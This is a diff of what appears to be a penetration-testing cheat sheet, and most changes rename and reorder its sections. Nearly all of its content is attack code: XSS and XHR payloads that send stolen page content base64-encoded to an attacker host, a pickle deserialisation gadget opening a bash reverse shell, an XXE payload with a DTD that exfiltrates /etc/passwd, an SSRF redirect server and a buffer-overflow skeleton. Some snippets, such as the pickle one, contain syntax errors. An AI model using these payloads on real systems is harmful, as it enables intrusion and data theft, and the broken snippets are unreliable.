@@ -22,7 +22,9 @@
 ## 02 Vulnerability Analysis
 ## 03 Web Application Analysis
 
-### HTML Injection
+### Hypertext Markup Language (HTML)
+
+#### Hypertext Markup Language (HTML) Injection
 
 ```c
 <script>
@@ -35,7 +37,31 @@ x.send();
 </script>
 ```
 
-### JSON POST Request with Authentication
+### JavaScript (JS)
+
+#### JavaScript (JS) Fetch URL and Base64 Encoding
+
+```c
+<script>fetch('http://<RHOST>/auth.php').then(r => r.text()).then(d => fetch("http://<LHOST>"+btoa(d)));</script>
+```
+
+```c
+const Req1 = new XMLHttpRequest();
+Req1.open("GET", "http://<RHOST>/index.php", true);
+
+Req1.onload = function(Event) {
+        const response = btoa(Req1.response);
+
+        const Req2 = new XMLHttpRequest();
+        Req2.open("GET", "http://<LHOST>/?"+response, true);
+        Req2.send();
+};
+Req1.send();
+```
+
+### JavaScript Object Notation (JSON)
+
+#### JavaScript Object Notation (JSON) POST Request with Authentication
 
 ```c
 POST /<PATH> HTTP/1.1
@@ -56,7 +82,9 @@ Connection: close
 }
 ```
 
-### Python Pickle RCE
+### Python
+
+#### Python Pickle RCE
 
 ```python
 import pickle
@@ -79,16 +107,16 @@ import pickle
 import os
 
 class RCE:
-    def __reduce__(self):
-        cmd = ("/bin/bash -c 'exec bash -i &>/dev/tcp/<LHOST>/<LPORT> <&1'")
-        return = os.system, (cmd, )
+	def __reduce__(self):
+		cmd = ("/bin/bash -c 'exec bash -i &>/dev/tcp/<LHOST>/<LPORT> <&1'")
+		return = os.system, (cmd, )
 
 if __name__ == '__main__':
-    pickle = pickle.dumps(RCE())
-    print(bas64.b64encode(pickled))
+	pickle = pickle.dumps(RCE())
+	print(bas64.b64encode(pickled))
 ```
 
-### Python Redirect for SSRF
+#### Python Redirect for Server-Side Request Forgery (SSRF)
 
 ```python
 #!/usr/bin/python3
@@ -104,7 +132,9 @@ class Redirect(BaseHTTPRequestHandler):
 HTTPServer(("0.0.0.0", 80), Redirect).serve_forever()
 ```
 
-> sudo python3 redirect.py http://127.0.0.1:3000/
+```c
+sudo python3 redirect.py http://127.0.0.1:3000/
+```
 
 ```python
 #!/usr/bin/env python
@@ -156,7 +186,7 @@ if __name__ == "__main__":
     main()
 ```
 
-### Python Web Request
+#### Python Web Request
 
 ```python
 import requests
@@ -169,115 +199,12 @@ proxyDict = {
 // get a session
 r = requests.get('http://')
 // send request
-r = requests.post('<DOMAIN>', data={'key': 'value'}, cookies={'PHPSESSID': r.cookies['PHPSESSID']} , proxies=proxyDict)
+r = requests.post('<RHOST>', data={'key': 'value'}, cookies={'PHPSESSID': r.cookies['PHPSESSID']} , proxies=proxyDict)
 ```
-
-### XML HTTP Request (XHR) in JavaScript
-
-
-#### Payload
-
-```c
-var xhr = new XMLHttpRequest();
-xhr = new XMLHttpRequest();
-xhr.open('GET', 'http://localhost:8080/users/');
-xhr.onreadystatechange = function() {
-  var users = JSON.parse(xhr.responseText);
-  if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
-    for (var i = 0; i < users.length; ++i) {
-      console.table(users[i]);
-    }
-  } else {
-    console.error('There was a problem with the request. ' + users);
-  }
-}
-xhr.send();
-```
-
-#### Forged Request
-
-```c
-myhttpserver = 'http://<LHOST>/'
-targeturl = 'http://<DOMAIN>/'
-
-req = new XMLHttpRequest;
-req.onreadystatechange = function() {
-    if (req.readyState == 4) {
-            req2 = new XMLHttpRequest;
-            req2.open('GET', myhttpserver + btoa(this.responseText),false);
-            req2.send();
-        }
-}
-req.open('GET', targeturl, false);
-req.send();
-```
-
-#### Simple Version
-
-```c
-req = new XMLHTTPRequest;
-req.open('GET',"http://<DOMAIN>/revshell.php");
-req.send();
-```
-
-### XML External Entity (XXE)
-
-#### Request
-
-```c
-<?xml version="1.0"?>
-<!DOCTYPE foo [<!ENTITY % <NAME> SYSTEM 
-"http://<LHOST>/<FILE>.dtd">%<NAME>;]>
-<root>
-<method>GET</method>
-<uri>/</uri>
-<user>
-<username><NAME>;</username>
-<password><NAME></password>
-</user>
-</root>
-```
-
-#### Content of <FILE>.dtd
-
-```c
-<!ENTITY % file SYSTEM "php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd">
-<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://<LHOST>/?f=%file;'>">
-%eval;
-%exfiltrate;
-```
-
-### Cross-Site Scripting (XSS)
-
-#### JavaScript to read Files on the System (.js)
-
-```c
-const fs = require('fs');
-
-fs.readFile('/etc/passwd', 'utf8', (err, data) => {
-  if (err) throw err;
-  console.log(data);
-});
-```
-
-#### Payload from XML File
-
-```c
-<?xml version="1.0" encoding="UTF-8"?>
-<html xmlns:html="http://w3.org/1999/xhtml">
-<html:script>prompt(document.domain);</html:script>
-</html>
-```
-
-## 04 Database Assessment
-## 05 Password Attacks
-## 06 Wireless Attacks
-## 07 Reverse Engineering
-## 08 Exploitation Tools
 
 ### Web Shells
 
-#### ASPX
+#### Active Server Page Extended (ASPX)
 
 ```c
 <?xml version="1.0" encoding="UTF-8"?>
@@ -308,10 +235,117 @@ Response.write(o)
 -->
 ```
 
+### Extensible Markup Language (XML)
+
+#### Extensible Markup Language (XML) Hypertext Markup Language (HTTP) Request (XHR) in JavaScript (JS)
+
+##### Payload
+
+```c
+var xhr = new XMLHttpRequest();
+xhr = new XMLHttpRequest();
+xhr.open('GET', 'http://localhost:8080/users/');
+xhr.onreadystatechange = function() {
+  var users = JSON.parse(xhr.responseText);
+  if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
+    for (var i = 0; i < users.length; ++i) {
+      console.table(users[i]);
+    }
+  } else {
+    console.error('There was a problem with the request. ' + users);
+  }
+}
+xhr.send();
+```
+
+##### Forged Request
+
+```c
+myhttpserver = 'http://<LHOST>/'
+targeturl = 'http://<RHOST>/'
+
+req = new XMLHttpRequest;
+req.onreadystatechange = function() {
+    if (req.readyState == 4) {
+            req2 = new XMLHttpRequest;
+            req2.open('GET', myhttpserver + btoa(this.responseText),false);
+            req2.send();
+        }
+}
+req.open('GET', targeturl, false);
+req.send();
+```
+
+##### Simple Version
+
+```c
+req = new XMLHTTPRequest;
+req.open('GET',"http://<RHOST>/revshell.php");
+req.send();
+```
+
+### Extensible Markup Language (XML)
+
+#### Extensible Markup Language (XML) External Entity (XXE)
+
+##### Request
+
+```c
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY % <NAME> SYSTEM 
+"http://<LHOST>/<FILE>.dtd">%<NAME>;]>
+<root>
+<method>GET</method>
+<uri>/</uri>
+<user>
+<username><NAME>;</username>
+<password><NAME></password>
+</user>
+</root>
+```
+
+##### Content of <FILE>.dtd
+
+```c
+<!ENTITY % file SYSTEM "php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://<LHOST>/?f=%file;'>">
+%eval;
+%exfiltrate;
+```
+
+### Cross-Site Scripting (XSS)
+
+#### JavaScript (JS) to read Files on the System (.js)
+
+```c
+const fs = require('fs');
+
+fs.readFile('/etc/passwd', 'utf8', (err, data) => {
+  if (err) throw err;
+  console.log(data);
+});
+```
+
+#### Payload from Extensible Markup Language (XML) File
+
+```c
+<?xml version="1.0" encoding="UTF-8"?>
+<html xmlns:html="http://w3.org/1999/xhtml">
+<html:script>prompt(document.domain);</html:script>
+</html>
+```
+
+## 04 Database Assessment
+## 05 Password Attacks
+## 06 Wireless Attacks
+## 07 Reverse Engineering
+## 08 Exploitation Tools
 ## 09 Sniffing & Spoofing
 ## 10 Post Exploitation
 
-### Bad YAML
+### YAML Ain't Markup Language (YAML)
+
+#### Bad YAML Ain't Markup Language (YAML)
 
 ```c
 - hosts: localhost
@@ -325,7 +359,9 @@ Response.write(o)
 ## 13 Social Engineering Tools
 ## Basics
 
-### SSH Program Execution
+### Secure Shell (SSH)
+
+#### Secure Shell (SSH) Program Execution
 
 ```python
 #!/usr/bin/python
@@ -341,7 +377,9 @@ s.close()
 
 ## Exploiting
 
-### Skeleton Exploit Python Script
+### Python
+
+#### Skeleton Exploit Python Script
 
 > https://github.com/0xsyr0/Buffer_Overflow
 
@@ -355,14 +393,14 @@ port = 9999
 buffer = #TBD
 
 try:
-    print '[+] Sending buffer'
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect((address,port))
-    s.recv(1024)
-    s.send(buffer + '\r\n')
+	print '[+] Sending buffer'
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	s.connect((address,port))
+	s.recv(1024)
+	s.send(buffer + '\r\n')
 except:
-    print '[!] Unable to connect to the application.'
-    sys.exit(0)
+ 	print '[!] Unable to connect to the application.'
+ 	sys.exit(0)
 finally:
-    s.close()
+	s.close()
 ```
